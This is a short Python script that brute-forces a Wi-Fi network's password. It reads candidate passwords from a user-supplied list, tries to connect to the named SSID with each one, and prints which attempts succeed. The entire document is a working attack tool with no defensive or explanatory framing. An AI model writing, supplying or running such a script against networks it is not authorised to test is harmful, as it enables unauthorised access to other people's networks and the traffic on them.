from wireless import Wireless

wifi_name = str(input('Enter wifi name for bruteforcing: '))
password_file = input('Enter the file/path of the password list. ')

wireless = Wireless()
with open(password_file, 'r') as file:
    for line in file.readlines():
        if wireless.connect(ssid=wifi_name, password=line.strip()) == True:
            print('[+] ' + line.strip() + ' - Success!')
        else:
            print('[-] ' + line.strip() + ' - Failed!')
